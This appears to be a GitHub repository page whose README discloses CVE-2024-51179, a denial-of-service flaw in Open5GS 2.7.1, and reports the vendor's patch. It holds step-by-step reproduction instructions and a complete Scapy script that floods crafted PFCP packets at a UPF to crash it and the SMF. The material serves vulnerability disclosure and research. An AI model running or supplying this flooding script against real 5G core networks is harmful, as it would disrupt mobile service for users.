=== Content from github.com_10a4eeb8_20250115_081400.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLakshmirnr%2FCVE-2024-51179)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FLakshmirnr%2FCVE-2024-51179)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Lakshmirnr%2FCVE-2024-51179)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Lakshmirnr](/Lakshmirnr)
/
**[CVE-2024-51179](/Lakshmirnr/CVE-2024-51179)**
Public

* [Notifications](/login?return_to=%2FLakshmirnr%2FCVE-2024-51179) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FLakshmirnr%2FCVE-2024-51179)
* [Star
   3](/login?return_to=%2FLakshmirnr%2FCVE-2024-51179)

[3
stars](/Lakshmirnr/CVE-2024-51179/stargazers) [0
forks](/Lakshmirnr/CVE-2024-51179/forks) [Branches](/Lakshmirnr/CVE-2024-51179/branches) [Tags](/Lakshmirnr/CVE-2024-51179/tags) [Activity](/Lakshmirnr/CVE-2024-51179/activity)
 [Star](/login?return_to=%2FLakshmirnr%2FCVE-2024-51179)

 [Notifications](/login?return_to=%2FLakshmirnr%2FCVE-2024-51179) You must be signed in to change notification settings

* [Code](/Lakshmirnr/CVE-2024-51179)
* [Issues
  0](/Lakshmirnr/CVE-2024-51179/issues)
* [Pull requests
  0](/Lakshmirnr/CVE-2024-51179/pulls)
* [Actions](/Lakshmirnr/CVE-2024-51179/actions)
* [Projects
  0](/Lakshmirnr/CVE-2024-51179/projects)
* [Security](/Lakshmirnr/CVE-2024-51179/security)
* [Insights](/Lakshmirnr/CVE-2024-51179/pulse)

Additional navigation options

* [Code](/Lakshmirnr/CVE-2024-51179)
* [Issues](/Lakshmirnr/CVE-2024-51179/issues)
* [Pull requests](/Lakshmirnr/CVE-2024-51179/pulls)
* [Actions](/Lakshmirnr/CVE-2024-51179/actions)
* [Projects](/Lakshmirnr/CVE-2024-51179/projects)
* [Security](/Lakshmirnr/CVE-2024-51179/security)
* [Insights](/Lakshmirnr/CVE-2024-51179/pulse)

# Lakshmirnr/CVE-2024-51179

    main[Branches](/Lakshmirnr/CVE-2024-51179/branches)[Tags](/Lakshmirnr/CVE-2024-51179/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[14 Commits](/Lakshmirnr/CVE-2024-51179/commits/main/) | | |
| [README.md](/Lakshmirnr/CVE-2024-51179/blob/main/README.md "README.md") | | [README.md](/Lakshmirnr/CVE-2024-51179/blob/main/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-51179 : Flooding of Crafted packets from an Attacker can crash UPF/SMF in Open5gs

# Vulnerability Description

**Description:**
An issue in Open 5GS v.2.7.1 allows a remote attacker to cause a denial of servie via the Network Function Virtualizations (NFVs) such as the User Plane Function (UPF) and the Session Management Function (SMF). The Packet Data Unit (PDU) session establishment process is impacted by the crashes occurring within the NFVs.

An attacker, after obtaining the IP address of the User Plane Function
(UPF), the PFCP port, and the SEID (Session Endpoint Identifier), can craft and flood
malicious PFCP (Packet Forwarding Control Protocol) packets to the UPF. The required
parameters can be intercepted using tools like Wireshark if the attacker has access to the
user plane traffic.

**Type of Vulnerability:** Denial Of Service

**Impact:** Upon sending the malicious packet, the UPF becomes erroneous, affecting
the establishment of new PDU sessions. Additionally, the SMF (Session Management
Function) is impacted due to the flood of malicious PFCP packets, disrupting Core functions

# STEPS TO REPRODUCE THE ATTACK

**Preconditions:** The 5G core network was set up using Open5GS as the core network
and UERANSIM as the emulation tool for the gNB (Next Generation NodeB) and UE
(User Equipment).

**STEPS TO PERFORM ATTACK**

1. Ensure Open5GS is running by checking the status of Open5GS components (AMF,
   SMF, UPF, etc.)
2. Verify PDU session establishment by using UERANSIM to initiate a PDU session
   and capturing traffic with Wireshark.
3. Open Wireshark and select the network interface used for the user plane.
4. Start capturing traffic with a display filter for PFCP packets:
5. Initiate a PDU session from UERANSIM to ensure PFCP packets are visible in the
   capture.
6. In Wireshark, find and note the UPF IP address, UPF port (usually 8805), and
   SEID from the captured PFCP packets.
7. Use the following script to flood the packets to the UPF.

```
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.inet import IP, UDP
import socket
import struct
UPF_IP = "192.168.56.113"
UPF_PORT = 8805
message_type = 53
sequence_number = 1
seid = 0x0010000000000000
version = 1
spare = 0
mp = 0
s_flag = 1
byte0 = (version << 5) | (s_flag << 2)
length = 0
seid_bytes = seid.to_bytes(8, 'big')
sequence_number_bytes = sequence_number.to_bytes(3, 'big')
pfcp_header = struct.pack('!BBH', byte0, message_type, length) + seid_bytes + sequence_number_bytes
ie_type = 150
ie_length = 13
flags = 0x01
fseid_seid = seid.to_bytes(8, 'big')
fseid_ipv4 = socket.inet_aton(UPF_IP)
fseid_ie = struct.pack('!HHB', ie_type, ie_length, flags) + fseid_seid + fseid_ipv4
pfcp_message = pfcp_header + fseid_ie
pfcp_message_length = len(pfcp_message) - 4
pfcp_header_with_length = struct.pack('!BBH', byte0, message_type, pfcp_message_length) + seid_bytes + sequence_number_bytes
pfcp_message = pfcp_header_with_length + fseid_ie
packet = IP(dst=UPF_IP) / UDP(sport=RandShort(), dport=UPF_PORT) / Raw(load=pfcp_message)
packet[UDP].chksum = None
print(f"Packet Summary: {packet.summary()}")
hexdump(packet)
for _ in range(1000):
    send(packet)
print("Sent 1000 malicious PFCP packets to UPF.")

```

8. Monitor the network impact using Wireshark or check the logs to observe any
   anomalies or failures in packet processing.
9. Attempt to establish new PDU sessions from UERANSIM to see if the establishment
   fails due to the flooding.

# SMF STATUS AFTER THE ATTACK

[![smfcurrent](https://private-user-images.githubusercontent.com/172017730/384438675-78478149-7249-4af3-9b0d-c0001d8b26cf.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY5MjkxNDAsIm5iZiI6MTczNjkyODg0MCwicGF0aCI6Ii8xNzIwMTc3MzAvMzg0NDM4Njc1LTc4NDc4MTQ5LTcyNDktNGFmMy05YjBkLWMwMDAxZDhiMjZjZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE1JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNVQwODE0MDBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yODRkYzMzNzIzNzAyYWQ0MTQ3YzNiZWE3MGE1OTY4ZmYzMmU4MWMwN2FkMDk1NGU2OWNhZDVkNjFmYjc0YWE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.DoR4ccbw-E6wa2TdSi98Z077PK5WDRzGKLdX01ZpI84)](https://private-user-images.githubusercontent.com/172017730/384438675-78478149-7249-4af3-9b0d-c0001d8b26cf.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY5MjkxNDAsIm5iZiI6MTczNjkyODg0MCwicGF0aCI6Ii8xNzIwMTc3MzAvMzg0NDM4Njc1LTc4NDc4MTQ5LTcyNDktNGFmMy05YjBkLWMwMDAxZDhiMjZjZi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE1JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNVQwODE0MDBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yODRkYzMzNzIzNzAyYWQ0MTQ3YzNiZWE3MGE1OTY4ZmYzMmU4MWMwN2FkMDk1NGU2OWNhZDVkNjFmYjc0YWE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.DoR4ccbw-E6wa2TdSi98Z077PK5WDRzGKLdX01ZpI84)

# WIRESHARK CAPTURE OF THE MALICIOUS PACKET

[![377424722-253fa5a4-fbae-4e0d-8638-1f1d59633b22](https://private-user-images.githubusercontent.com/172017730/384440927-8197f4f6-9a1e-4b29-ac25-ff4e4ad75832.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY5MjkxNDAsIm5iZiI6MTczNjkyODg0MCwicGF0aCI6Ii8xNzIwMTc3MzAvMzg0NDQwOTI3LTgxOTdmNGY2LTlhMWUtNGIyOS1hYzI1LWZmNGU0YWQ3NTgzMi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE1JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNVQwODE0MDBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xNTg5MjJkZjZiZWY0ZGUwMzM4MTc4MDdhNjk0NzBjMmM1MmEzY2FlODI2OGY2MGEzY2M1MDczMWVjNGI0NmQxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.3V968S0nP6bgrma5sb5FeDf5Ug27YQrGGdh7M7XGd8A)](https://private-user-images.githubusercontent.com/172017730/384440927-8197f4f6-9a1e-4b29-ac25-ff4e4ad75832.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY5MjkxNDAsIm5iZiI6MTczNjkyODg0MCwicGF0aCI6Ii8xNzIwMTc3MzAvMzg0NDQwOTI3LTgxOTdmNGY2LTlhMWUtNGIyOS1hYzI1LWZmNGU0YWQ3NTgzMi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwMTE1JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDExNVQwODE0MDBaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0xNTg5MjJkZjZiZWY0ZGUwMzM4MTc4MDdhNjk0NzBjMmM1MmEzY2FlODI2OGY2MGEzY2M1MDczMWVjNGI0NmQxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.3V968S0nP6bgrma5sb5FeDf5Ug27YQrGGdh7M7XGd8A)

# CURRENT STATUS

The vulnerability, documented as Issue #3497 on the Open5GS GitHub page ([open5gs/open5gs#3497](https://github.com/open5gs/open5gs/issues/3497)), was reported to the Open5GS vendor, who identified the root cause as a memory deallocation issue leading to system crashes. A patch has since been applied, and the code has been updated to resolve the issue. You can review the updated code here.

<https://github.com/open5gs/open5gs/commit/e3790b45b4bc0b261e0946cf93755099a9525cfd>

CVE-2024-51179 has been assigned.

# CREDITS

Digital University Kerala, Thiruvananthapuram, India and Centre for Development of Telematics (C-DOT), Government of India

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/Lakshmirnr/CVE-2024-51179/activity)
### Stars

[**3**
stars](/Lakshmirnr/CVE-2024-51179/stargazers)
### Watchers

[**1**
watching](/Lakshmirnr/CVE-2024-51179/watchers)
### Forks

[**0**
forks](/Lakshmirnr/CVE-2024-51179/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FLakshmirnr%2FCVE-2024-51179&report=Lakshmirnr+%28user%29)

## [Releases](/Lakshmirnr/CVE-2024-51179/releases)

No releases published

## [Packages 0](/users/Lakshmirnr/packages?repo_name=CVE-2024-51179)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


